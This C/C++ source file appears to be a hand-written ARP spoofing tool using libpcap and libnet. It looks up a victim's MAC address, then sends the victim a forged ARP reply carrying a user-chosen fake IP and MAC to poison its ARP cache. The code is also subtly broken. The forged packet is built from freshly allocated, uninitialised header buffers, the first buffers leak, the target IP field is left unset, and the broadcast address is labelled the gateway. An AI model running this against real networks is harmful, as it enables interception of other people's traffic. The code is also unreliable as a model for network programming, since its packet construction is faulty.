// send_arp.cpp

#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <libnet.h>
#include <string.h>

#include <sys/ioctl.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <stdlib.h>
#include "arp_spoof.h"

void arp_main(u_char *s_mac, u_char *d_mac, struct in_addr s_ip, struct in_addr d_ip, pcap_t *handle)
{
	int fd;					//for socket
	struct ifreq ifr;
	char iface[] = "eth0";

	struct libnet_ethernet_hdr *eth_hdr;	//ethernet header
	struct libnet_arp_hdr *arp_hdr;		//arp hedaer
	struct pcap_pkthdr *header;		//packet header	
	
	int packet_size = 42;	//arp_packet size (ether + arp)
	
	u_char *packet;			//For the packet we send
	const u_char *reply;		//For arp reply packet
	
	char tmp_mac[20];
	int tmp_val[6];
	char *fake_mac;
	uint8_t f_mac[6];

	char buf[INET_ADDRSTRLEN];			//For d_ip address
	int index = 0;

	
	char errbuf[PCAP_ERRBUF_SIZE];
	char dev[] = "eth0";
	
	bpf_u_int32 mask;
	bpf_u_int32 net;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;

	strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);

	puts("IP address of the target : ");

	while(1)
	{
		fgets(buf, sizeof(buf), stdin);
		buf[strlen(buf) - 1] = '\0';
	
		if(inet_pton(AF_INET, buf, &d_ip.s_addr) == 0)
		{
			printf("Invalid IP address! \n");
			continue;
		}
		else
			break;
	}

	printf("\nMy Network Status: \n");
	printf("Device: %s\n", iface);
	
        ioctl(fd, SIOCGIFHWADDR, &ifr);

	memcpy(s_mac, (u_char *)ifr.ifr_hwaddr.sa_data, 6);
	
	//MAC address
	printf("MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n",
		s_mac[0], s_mac[1], s_mac[2], s_mac[3], s_mac[4], s_mac[5]);
	
	//IP addrses
        ioctl(fd, SIOCGIFADDR, &ifr);
	s_ip = ((struct sockaddr_in *)&ifr.ifr_addr) -> sin_addr;
	printf("IP address: %s\n", inet_ntop(AF_INET, &s_ip, buf, sizeof(buf)));
	
	//Gateway
	ioctl(fd, SIOCGIFBRDADDR, &ifr);
	printf("Gateway: %s\n", inet_ntop(AF_INET, &(((struct sockaddr_in *)&ifr.ifr_broadaddr) -> sin_addr), buf, sizeof(buf)));

	printf("\nVictim Network Status: \n");	
	
	eth_hdr = (struct libnet_ethernet_hdr *)malloc(sizeof(struct libnet_ethernet_hdr));
	arp_hdr = (struct libnet_arp_hdr *)malloc(sizeof(struct libnet_arp_hdr));
	packet = (u_char *)malloc(packet_size);

	memset(packet, 0, 42);		//initiallize the packet memory with 0's

	if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
	{
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}
	
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL)
	{
		fprintf(stderr, "%s\n", errbuf);
		exit(1);
	}

	
	for (int i = 0; i < 6; i++)
	{
		eth_hdr -> ether_dhost[i] = 0xff;	//For broadcasting
		eth_hdr -> ether_shost[i] = s_mac[i];
	}
	
	eth_hdr -> ether_type = htons(ETHERTYPE_ARP);	//ARP protocol, ETHERTYPE_ARP = 0x0806
	memcpy(packet, (u_char *)eth_hdr, 14);		//ethernet header

	arp_hdr -> ar_hrd = htons(ARPHRD_ETHER);	//ARPHRD_ETHER = 1
	arp_hdr -> ar_pro = htons(0x0800);		//0x0800 (IPv4)
	arp_hdr -> ar_hln = 0x06;			//header size
	arp_hdr -> ar_pln = 0x04;			//protocol size
	arp_hdr -> ar_op = htons(ARPOP_REQUEST);	//ARPOP_REQUEST = 1

	memcpy(packet + 14, (u_char *)arp_hdr, 8);	//Copy arp header data into the packet
	memcpy(packet + 22, s_mac, 6);			//Source MAC address
	memcpy(packet + 28, &s_ip.s_addr, 4);		//Source IP address
	memset(packet + 32, 0x00, 6);			//We don't know the MAC address yet
	memcpy(packet + 38, &d_ip.s_addr, 4);		//Victim's IP address

	pcap_sendpacket(handle, packet, packet_size);	//Send ARP request packet
	
	//send_arp(s_mac, d_mac, s_ip, d_ip, handle);		//send arp packet

	eth_hdr = (struct libnet_ethernet_hdr *)malloc(sizeof(struct libnet_ethernet_hdr));
	arp_hdr = (struct libnet_arp_hdr *)malloc(sizeof(struct libnet_arp_hdr));

	while(1)					//Check the packets!
	{
		index++;
		pcap_next_ex(handle, &header, &reply);
		if(get_arp(reply, s_mac, d_mac, d_ip) == 1)	
			break;

		if(index > 50)				//If we check more than 50 packets
		{
			printf("No ARP REPLY packet is captured\n");
			exit(1);
		}
	}

	printf("Victim MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n", 
		d_mac[0], d_mac[1], d_mac[2], d_mac[3], d_mac[4], d_mac[5]);
	printf("Victim IP address: %s\n\n", inet_ntop(AF_INET, &d_ip, buf, sizeof(buf)));
	
	puts("Write FAKE IP address: ");
	
	while(1)
	{
		fgets(buf, sizeof(buf), stdin);
		buf[strlen(buf) -1 ] = '\0';

		if(inet_pton(AF_INET, buf, &s_ip.s_addr) == 0)
		{
			printf("Invalid IP address! \n");
			continue;
		}
		else
			break;
	}
	
	puts("Write FAKE MAC address: ");
	
	while(1)
	{
		fgets(tmp_mac, sizeof(tmp_mac), stdin);
		tmp_mac[strlen(tmp_mac) - 1] = '\0';

		if(sscanf(tmp_mac, "%x:%x:%x:%x:%x:%x", 
			&tmp_val[0], &tmp_val[1], &tmp_val[2],
			&tmp_val[3], &tmp_val[4], &tmp_val[5]) < 6)
		{
			printf("Invalid MAC address! (00:00:00:00:00:00) \n");
			continue;
		}
		else
		{
			for (int i = 0; i < 6; i++)
				f_mac[i] = (uint8_t) tmp_val[i];
			break;
		}
	}
	
	//Change the ethernet destination host from broadcast to victim's mac address
	for(int i = 0; i < 6; i++)
		eth_hdr -> ether_dhost[i] = d_mac[i];	
	
	//Change the operation from request to reply
	arp_hdr -> ar_op = htons(ARPOP_REPLY);		
		
	memcpy(packet, (u_char *)eth_hdr, 14); 
	memcpy(packet+14, (u_char *)arp_hdr, 8);
	memcpy(packet + 22, f_mac, 6);
	memcpy(packet + 28, &s_ip.s_addr, 4);
	memcpy(packet + 32, d_mac, 6);

	printf("\nSend Fake PACKET!!\n");
	pcap_sendpacket(handle, packet, packet_size);
	
	free(packet);
	free(eth_hdr);
	free(arp_hdr);

	close(fd);
}
